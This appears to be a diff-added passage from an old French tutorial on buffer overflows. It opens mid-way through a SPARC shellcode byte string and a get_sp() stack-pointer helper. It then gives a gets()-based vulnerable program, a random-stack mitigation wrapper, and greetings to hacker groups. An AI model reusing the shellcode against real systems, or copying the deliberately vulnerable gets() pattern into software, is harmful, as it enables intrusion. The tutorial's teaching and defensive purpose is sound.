+  "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e"
+  "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"
+  "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\xaa\x10\x3f\xff"
+  "\x91\xd5\x60\x01\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd5\x60\x01";
+
+unsigned long get_sp(void) {
+  __asm__("or %sp, %sp, %i0");
+}
+
+#endif
+------------------------------------------------------------------------------
+
+IX)-Solution aux buffer overflows!
+----------------------------------
+
+En faite pour eviter que le programme sois exploitable , il y a une petite
+solution.Il faut que a chaque lancement du prog , l'adresse de la stack change
+pour cela voici un petit code qui faut rajouter au code:
+exemple:
+1-)code exploitable
+
+    main() {
+        char buffer[1024];
+
+        printf("buffer=%p\n", buffer);
+        gets(buffer);           /* vulnerable */
+        return 0;
+    }
+2-)RANDOM STACK rajouté à notre code
+
+    #include <unistd.h>
+    #include <fcntl.h>
+    #include <stdlib.h>
+
+    real_main() {
+        char buffer[1024];
+
+        printf("buffer=%p\n", buffer);
+        gets(buffer);           /* insecure! */
+        return 0;
+    }
+
+    main() {
+        if(getenv("RANDOM_STACK")) {
+            void *x;
+            int fd;
+            size_t n;
+            ssize_t m;
+            char buffer[sizeof (size_t)];
+
+            fd = open("/dev/urandom", O_RDONLY);
+            read(fd, buffer, sizeof (size_t));
+            close(fd);
+            n = *(size_t *)buffer;
+            n %= atoi(getenv("RANDOM_STACK"));
+            x = alloca(n);
+        }
+        exit(real_main());
+    }
+autre solution:
+---------------
+http://www.false.com/security/linux/index.html
+
+X)- CONCLUSION & GREETz
+-----------------------
+
+Conclusion simple : j'espere que vous avez compris le contexte , et que j'ai
+pas dit trop de connerie.
+PS: sorry pour l'orthographe, vous comprenez le texte est long...
+Greetz To: 
+aleph1,Richard Kettlewell,Spyjure,SDI,linux-sa,tekneeq,happy-h,nanard,
+NearZ,rwx,cyberarmy,ADM crew,w00w00,jsbach,b4b0,...And
+clemm, spoty , ank , k-roleen, shado, klog, rockme, XSFX,
+3d13, organiks,[fred], torcy&marcx dormoy&18eme (Ali k.,
+Xav,Olivier,Mathieux,Mémet,Arnauld,Camel,...),cantepeau(sophie,ced,youness,
+seb,la shente,bouboule,ouadgerie, ...), toulouse(Gui.,florian,Lionel,JM,Dav,
+Vincent,Bruno,yohan,seb,cyril,damien,...).......Et tous ce que j'oublie...
+
+OrganiKs Crew! @-mefi toi de l'esprit malin-@
+---EOF---
+
+
